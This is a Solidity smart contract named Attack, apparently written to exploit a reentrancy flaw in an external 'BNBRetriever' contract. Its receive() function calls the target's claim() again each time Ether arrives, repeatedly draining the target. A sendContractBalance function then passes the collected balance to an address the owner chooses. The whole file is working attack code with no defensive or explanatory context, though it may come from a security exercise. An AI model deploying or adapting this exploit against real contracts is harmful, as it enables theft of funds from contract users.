// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import "bnbretrieverAuto.sol";

interface IBNBRetriever {
    function claim() external;
}

contract Attack is Ownable {
    IBNBRetriever public immutable bnbRetriever;

    event Received(address, uint);

    constructor(address bnbRetrieverAddress) {
        bnbRetriever = IBNBRetriever(bnbRetrieverAddress);
    }



    function attack() external onlyOwner {
        bnbRetriever.claim();
    }

    function sendContractBalance(address payable to) public onlyOwner {
        require(address(this).balance > 0,"07");
        to.transfer(address(this).balance);
    }    

        // Fallback is called when DepositFunds sends Ether to this contract.
    fallback() external payable {

    }

    receive() external payable {
        bnbRetriever.claim();
              
    emit Received(msg.sender, msg.value);        
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }    

}